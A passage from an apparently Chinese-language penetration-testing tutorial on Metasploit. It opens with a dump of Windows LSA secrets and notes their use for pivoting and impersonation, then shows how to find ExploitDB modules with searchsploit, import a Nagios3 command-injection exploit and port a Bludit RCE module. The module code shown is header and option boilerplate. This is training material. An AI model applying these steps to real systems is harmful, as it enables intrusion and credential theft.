class="line"></span><br><span class="line">Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75</span><br><span class="line">cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line"></span><br><span class="line">Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588</span><br><span class="line">cur/hex : 00 f2 d1 31 e2 11 d3 01 </span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;</span><br><span class="line">cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f </span><br><span class="line">old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 </span><br><span class="line"></span><br><span class="line">Secret  : NL$KM</span><br><span class="line">cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f </span><br><span class="line"></span><br><span class="line">Secret  : SAC</span><br><span class="line"></span><br><span class="line">Secret  : SAI</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Alerter / service &#x27;Alerter&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_ALG / service &#x27;ALG&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_aspnet_state / service &#x27;aspnet_state&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dhcp / service &#x27;Dhcp&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dnscache / service &#x27;Dnscache&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LicenseService / service &#x27;LicenseService&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LmHosts / service &#x27;LmHosts&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_MSDTC / service &#x27;MSDTC&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcLocator / service &#x27;RpcLocator&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcSs / service &#x27;RpcSs&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_stisvc / service &#x27;stisvc&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_TlntSvr / service &#x27;TlntSvr&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_WebClient / service &#x27;WebClient&#x27; with username : NT AUTHORITY\LocalService</span><br></pre></td></tr></table></figure><p>从这一点来看，如果机器连接到更广泛的网络，我们可以使用这个战利品在系统中旋转，获得对内部资源的访问权限，并在网络的整体安全态势薄弱的情况下冒充具有更高访问权限的用户.</p><h2 id="编写和导入模块"><a href="#编写和导入模块" class="headerlink" title="编写和导入模块"></a>编写和导入模块</h2><p>要安装任何已经被其他用户移植过来的新 Metasploit 模块，可以选择<code>msfconsole</code>从终端更新它们，这将确保所有最新的漏洞、辅助工具和功能都将安装在最新版本的<code>msfconsole</code>. 只要移植的模块被推送到 GitHub 上的主要 Metasploit-framework 分支，我们就应该更新到最新的模块。</p><p>但是，如果我们只需要一个特定的模块并且不想执行完整升级，我们可以下载该模块并手动安装。我们将专注于在 ExploitDB 中搜索现成可用的 Metasploit 模块，我们可以将这些模块直接导入到我们的<code>msfconsole</code>本地版本中。</p><p>在搜索自定义漏洞时，<a href="https://www.exploit-db.com/">ExploitDB是一个不错的选择。</a>我们可以使用标签来搜索每个可用脚本的不同利用场景。这些标签之一是<a href="https://www.exploit-db.com/?tag=3">Metasploit Framework (MSF)</a>，如果选中，将仅显示 Metasploit 模块格式中也可用的脚本。这些可以直接从 ExploitDB 下载并安装在我们本地的 Metasploit Framework 目录中，从那里可以在<code>msfconsole</code>.</p><p><img src="/img/METASPLOIT3.png"></p><p>假设我们想使用为 找到的漏洞利用程序<code>Nagios3</code>，它将利用命令注入漏洞。我们正在寻找的模块是<code>Nagios3 - &#39;statuswml.cgi&#39; Command Injection (Metasploit)</code>. 所以我们启动<code>msfconsole</code>并尝试搜索那个特定的漏洞利用，但我们找不到它。这意味着我们的 Metasploit 框架不是最新的，或者<code>Nagios3</code>我们正在寻找的特定漏洞利用模块不在 Metasploit 框架的官方更新版本中。</p><h4 id="MSF-搜索漏洞"><a href="#MSF-搜索漏洞" class="headerlink" title="MSF - 搜索漏洞"></a>MSF - 搜索漏洞</h4><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search nagios</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                          Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution</span><br><span class="line">   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution</span><br><span class="line">   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution</span><br><span class="line">   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution</span><br><span class="line">   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection</span><br><span class="line">   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration</span><br></pre></td></tr></table></figure><p>但是，我们可以<a href="https://www.exploit-db.com/exploits/9861">在 ExploitDB 的条目中</a>找到漏洞利用代码。或者，如果我们不想使用我们的网络浏览器在 ExploitDB 中搜索特定的漏洞，我们可以使用 CLI 版本，<code>searchsploit</code>.</p><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit nagios3</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Remote Command Execution                                                                                             | multiple/remote/24084.py</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>请注意，以 结尾的托管文件终止符<code>.rb</code>是 Ruby 脚本，很可能是专门为在<code>msfconsole</code>. 我们还可以仅按<code>.rb</code>文件终止符进行过滤，以避免无法在<code>msfconsole</code>. 请注意，并非所有<code>.rb</code>文件都会自动转换为<code>msfconsole</code>模块。有些漏洞是用 Ruby 编写的，其中没有任何与 Metasploit 模块兼容的代码。我们将在以下小节中查看这些示例之一。</p><p> MSF - 搜索漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit -t Nagios3 --exclude=&quot;.py&quot;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>我们必须下载<code>.rb</code>文件并将其放在正确的目录中。存储所有模块、脚本、插件和<code>msfconsole</code>专有文件的默认目录是<code>/usr/share/metasploit-framework</code>. 关键文件夹也在隐藏位置的主文件夹和根文件夹中进行了符号链接<code>~/.msf4/</code>。</p><h4 id="MSF-目录结构"><a href="#MSF-目录结构" class="headerlink" title="MSF - 目录结构"></a>MSF - 目录结构</h4><p> MSF - 目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/</span><br><span class="line"></span><br><span class="line">app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor</span><br><span class="line">config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts</span><br><span class="line">data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools</span><br></pre></td></tr></table></figure><p> MSF - 目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls .msf4/</span><br><span class="line"></span><br><span class="line">history  local  logos  logs  loot  modules  plugins  store</span><br></pre></td></tr></table></figure><p><a href="https://www.exploit-db.com/exploits/9861">我们下载好exploit</a>后拷贝到合适的目录下。请注意，我们的主文件夹<code>.msf4</code>位置可能不具有该文件夹可能具有的所有文件夹结构<code>/usr/share/metasploit-framework/</code>。因此，我们只需要<code>mkdir</code>适当的文件夹，使结构与原始文件夹相同，以便<code>msfconsole</code>可以找到新模块。之后，我们将继续将<code>.rb</code>脚本直接复制到主要位置。</p><p>请注意，某些命名约定如果没有得到充分遵守，将在尝试识别<code>msfconsole</code>我们安装的新模块时产生错误。始终使用蛇形、字母数字字符和下划线而不是破折号。</p><p>例如：</p><ul><li><code>nagios3_command_injection.rb</code></li><li><code>our_module_here.rb</code></li></ul><h4 id="MSF-在运行时加载附加模块"><a href="#MSF-在运行时加载附加模块" class="headerlink" title="MSF - 在运行时加载附加模块"></a>MSF - 在运行时加载附加模块</h4><p> MSF - 在运行时加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure><h4 id="MSF-加载附加模块"><a href="#MSF-加载附加模块" class="headerlink" title="MSF - 加载附加模块"></a>MSF - 加载附加模块</h4><p> MSF - 加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; loadpath /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure><p>或者，我们也可以启动<code>msfconsole</code>并运行<code>reload_all</code>新安装的模块出现在列表中的命令。命令运行完没有报错后，要么试试<code>search [name]</code>里面的函数<code>msfconsole</code>，要么直接用<code>use [module-path]</code>直接跳转到新安装的模块。</p><p> MSF - 加载附加模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; reload_all</span><br><span class="line">msf6 &gt; use exploit/unix/webapp/nagios3_command_injection </span><br><span class="line">msf6 exploit(unix/webapp/nagios3_command_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/nagios3_command_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting                 Required  Description</span><br><span class="line">   ----     ---------------                 --------  -----------</span><br><span class="line">   PASS     guest                           yes       The password to authenticate with</span><br><span class="line">   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80                              yes       The target port (TCP)</span><br><span class="line">   SSL      false                           no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi</span><br><span class="line">   USER     guest                           yes       The username to authenticate with</span><br><span class="line">   VHOST                                    no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br></pre></td></tr></table></figure><p>现在我们已准备好针对我们的目标启动它。</p><hr><h2 id="将脚本移植到-Metasploit-模块中"><a href="#将脚本移植到-Metasploit-模块中" class="headerlink" title="将脚本移植到 Metasploit 模块中"></a>将脚本移植到 Metasploit 模块中</h2><p>要将自定义 Python、PHP 或任何类型的漏洞利用脚本改编为 Metasploit 的 Ruby 模块，我们需要学习 Ruby 编程语言。请注意，Metasploit 的 Ruby 模块始终使用硬选项卡编写。</p><p>当开始移植项目时，我们不需要从头开始编码。相反，我们可以从我们的项目所属的类别中获取现有的漏洞利用模块之一，并将其重新用于我们当前的移植脚本。请记住始终保持我们的自定义模块井井有条，以便我们和其他渗透测试人员在搜索自定义模块时可以从干净、井井有条的环境中受益。</p><p>我们首先选择一些漏洞利用代码移植到 Metasploit。在此示例中，我们将使用<a href="https://www.exploit-db.com/exploits/48746">Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass</a>。我们需要下载脚本，<code>48746.rb</code>然后将其复制到<code>/usr/share/metasploit-framework/modules/exploits/linux/http/</code>文件夹中。如果我们现在启动<code>msfconsole</code>，我们将只能在与上面相同的文件夹中找到一个<code>Bludit CMS</code>漏洞，确认我们的漏洞还没有被移植过来。好消息是该文件夹中已经有一个 Bludit 漏洞，因为我们将把它用作我们新漏洞的样板代码。</p><h4 id="移植-MSF-模块"><a href="#移植-MSF-模块" class="headerlink" title="移植 MSF 模块"></a>移植 MSF 模块</h4><p> 移植 MSF 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit</span><br><span class="line"></span><br><span class="line">bludit_upload_images_exec.rb</span><br></pre></td></tr></table></figure><p> 移植 MSF 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb</span><br></pre></td></tr></table></figure><p>在我们复制的文件的开头，也就是我们要填写信息的地方，我们可以注意到<code>include</code>样板模块开头的语句。这些是本节中提到的混合宏<code>Plugins and Mixins</code>，我们需要将它们更改为适合我们模块的混合宏。</p><p><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">如果我们想找到我们的模块工作所需的合适的 mixins、类和方法，我们将需要在rubydoc rapid7 文档</a>中查找不同的条目。</p><hr><h2 id="编写我们的模块"><a href="#编写我们的模块" class="headerlink" title="编写我们的模块"></a>编写我们的模块</h2><p>在特定评估期间，我们经常会面对运行专有代码以服务其客户的定制网络。我们手头的大多数模块甚至都没有在它们的周边留下凹痕，而且我们似乎无法用我们拥有的任何东西正确地扫描和记录目标。在这里，我们可能会发现重拾 Ruby 技能并开始编写模块代码很有帮助。</p><p><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework">有关 Metasploit Ruby 编码的所有必要信息都可以在Rubydoc.info Metasploit Framework</a>相关页面上找到。从扫描器到其他辅助工具，从定制的漏洞利用程序到移植的漏洞利用程序，用 Ruby 为框架编写代码是一项非常实用的技能。</p><p>请看下面一个类似的模块，我们可以将其用作漏洞利用移植的样板代码。这是<a href="https://www.exploit-db.com/exploits/47699">Bludit 目录遍历图像文件上传漏洞</a>利用，已经导入到<code>msfconsole</code>. 在漏洞利用概念验证 ( ) 之前，花点时间了解模块中包含的所有不同字段<code>POC</code>。请注意，此代码在下面的代码片段中没有更改以适应我们当前的导入，而是上面提到的预先存在的模块的直接快照。这些信息将需要针对新的移植项目进行相应调整。</p><h4 id="概念验证-要求"><a href="#概念验证-要求" class="headerlink" title="概念验证 - 要求"></a>概念验证 - 要求</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::FileDropper</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br></pre></td></tr></table></figure><p>我们可以查看<code>include</code>语句以了解每个语句的作用。<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">这可以通过将它们与rubydoc rapid7 文档</a>交叉引用来完成。以下是文档中解释的它们各自的功能：</p><table><thead><tr><th><strong>功能</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Msf::Exploit::Remote::HttpClient</code></td><td>该模块提供了在利用 HTTP 服务器时充当 HTTP 客户端的方法。</td></tr><tr><td><code>Msf::Exploit::PhpEXE</code></td><td>这是一种用于生成第一阶段 php 负载的方法。</td></tr><tr><td><code>Msf::Exploit::FileDropper</code></td><td>此方法在与目标建立会话后传输文件并处理文件清理。</td></tr><tr><td><code>Msf::Auxiliary::Report</code></td><td>此模块提供向 MSF DB 报告数据的方法。</td></tr></tbody></table><p>看看他们上面的目的，我们得出结论，我们不需要 FileDropper 方法，我们可以从最终的模块代码中删除它。</p><p>我们看到有不同的部分专门用于<code>info</code>模块的页面，<code>options</code>部分。我们不恰当地填写它们，向发现漏洞的个人、CVE 信息和其他相关详细信息提供信用。</p><h4 id="概念验证-模块信息"><a href="#概念验证-模块信息" class="headerlink" title="概念验证 - 模块信息"></a>概念验证 - 模块信息</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">  <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">    <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit Directory Traversal Image File Upload Vulnerability&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">      This module exploits a vulnerability in Bludit. A remote user could abuse the uuid</span></span><br><span class="line"><span class="string">      parameter in the image upload feature in order to save a malicious payload anywhere</span></span><br><span class="line"><span class="string">      onto the server, and then use a custom .htaccess file to bypass the file extension</span></span><br><span class="line"><span class="string">      check to finally get remote code execution.</span></span><br><span class="line"><span class="string">    &#125;</span>,</span><br><span class="line">    <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">    <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">      [</span><br><span class="line">        <span class="string">&#x27;christasa&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">        <span class="string">&#x27;sinn3r&#x27;</span>     <span class="comment"># Metasploit module</span></span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">      [</span><br><span class="line">        [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-16113&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/issues/1081&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac&#x27;</span> ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">    <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">        <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">        <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">      &#125;,</span><br><span class="line">    <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">      [</span><br><span class="line">        [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">      ],</span><br><span class="line">    <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-09-07&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>一般标识信息填好后，我们就可以转到<code>options</code>菜单变量了：</p><h4 id="概念验证-功能"><a href="#概念验证-功能" class="headerlink" title="概念验证 - 功能"></a>概念验证 - 功能</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">register_options(</span><br><span class="line">     [</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">       <span class="title class_">OptString</span>.new(<span 